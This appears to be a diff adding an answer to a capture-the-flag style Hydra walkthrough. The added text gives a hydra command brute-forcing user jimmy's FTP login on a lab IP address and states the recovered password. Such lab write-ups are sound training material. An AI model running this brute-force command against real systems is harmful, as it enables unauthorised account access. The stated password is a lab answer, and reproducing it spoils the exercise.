@@ -44,3 +44,9 @@ What is the default number of connections Hydra will run in parallel?
 
 ### Question 5
 What is jimmy’s password for the FTP server?
+
+Since I know that this may take me a long while, I waited to complete this until I have about 4-5 hours to wait on this command to cook.
+Now I run
+```hydra -l jimmy -P /usr/share/wordlists/metaploit/password.lst ftp://10.102.4.228```
+![Hydra Jimmy](./images/HydraJimmy.PNG)
+ I get that the password is acoustic
